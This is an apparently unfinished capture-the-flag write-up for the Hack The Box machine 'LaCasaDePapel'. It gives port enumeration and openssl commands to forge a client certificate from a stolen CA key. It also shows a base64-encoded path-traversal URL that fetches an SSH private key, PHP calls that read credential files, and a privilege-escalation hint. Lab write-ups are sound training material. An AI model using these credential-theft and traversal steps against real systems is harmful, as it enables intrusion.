Name & IP Address of Machine:
> # LaCasaDePapel : `10.10.10.131`
**Table Of Contents:**
<!-- TOC -->

- [Synopsis](#synopsis)
- [- `ssh -i id_rsa professor@lacasadepapel.htb`](#--ssh--i-id_rsa-professorlacasadepapelhtb)
- [Enumeration](#enumeration)
    - [Opened Ports:](#opened-ports)
- [FootHold](#foothold)
- [File_Get_Contents('/home/nairobi/ca.key');](#file_get_contentshomenairobicakey)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

<!-- /TOC -->

## Synopsis
- Generate client cert with the help of ca.key.
  ```bash
  openssl req -newkey rsa:2048 -keyout ircashem_key.pem -out ircashem_csr.pem -nodes -days 365 -subj "/CN=ircashem"  
  openssl x509 -req -in ircashem_csr.pem -CA server_cert.pem -CAkey server_key.pem -out ircashem_cert.pem -set_serial 01 -days 365
  openssl pkcs12 -export -clcerts -in ircashem_cert.pem -inkey ircashem_key.pem -out ircashem.p12                                 
  ```
- `https://lacasadepapel.htb/files/Li4vLnNzaC9pZF9yc2E=`
- `ssh -i id_rsa professor@lacasadepapel.htb`
---

## Enumeration

---
#### Opened Ports: 
- [ ] 21(FTP)
- [ ] 22(SSH)
- [ ] 80(HTTP)
- [ ] 443(HTTPS)

---

## FootHold
- `/home/oslo`
ScanDir('/home/nairobi');
File_Get_Contents('/home/nairobi/ca.key');
---

## Lateral Movement

---

## Privilege Escalation
- memcached.ini is inside your user directory
- You don't have write permission but you can rename that file and create new file since it is in your directory.
